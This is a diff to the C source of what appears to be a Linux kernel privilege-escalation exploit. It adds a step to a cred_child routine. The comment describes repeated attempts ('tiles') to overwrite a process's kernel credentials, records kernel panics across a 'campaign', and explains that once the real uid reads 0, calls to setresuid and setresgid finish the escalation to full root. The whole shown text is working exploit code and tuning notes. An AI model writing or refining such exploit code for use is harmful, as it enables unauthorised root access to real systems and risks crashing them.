@@ -1815,6 +1815,33 @@ static void cred_child(void)
 			g_daemon_mode = 1;
 			continue;
 		}
+		/*
+		 * 2.0.50: self-escalation at the half-cleared state.
+		 *
+		 * Run 5 shape: tiles landed ruid (and suid) but euid is stuck -
+		 * "Uid: 0 2000 0 0", the euid tile keeps hitting the page yet
+		 * never lands, 0/7 across seven attempts. Grinding the remaining
+		 * ~18 attempts is pointless and expensive: the run-5 session died
+		 * in a kernel panic on attempt 7, the fifth panic of the campaign.
+		 *
+		 * setresuid(0,0,0) is GUARANTEED legal by the POSIX unprivileged
+		 * rule: every target must be in {r,e,s}uid, and ruid=0 already
+		 * is. commit_creds then gives this task a fresh, kernel-allocated,
+		 * fully consistent all-zero cred - the sticky deadlock becomes a
+		 * win after one syscall, and the panic-exposing tile grind ends.
+		 * Same reasoning for the gid pair. Gated on ruid==0: with
+		 * ruid!=0 the targets are outside the permitted set and the call
+		 * would just fail with EPERM (and uid/gid has never been observed
+		 * sticky: 7/7 landed).
+		 */
+		if (getuid() == 0 && geteuid() != 0) {
+			if (setresgid(0, 0, 0))
+				dprintf(STDOUT_FILENO,
+					"[child-cred] setresgid errno=%d\n", errno);
+			if (setresuid(0, 0, 0))
+				dprintf(STDOUT_FILENO,
+					"[child-cred] setresuid errno=%d\n", errno);
+		}
 		uid = getuid();
 		euid = geteuid();
 		gid = getgid();
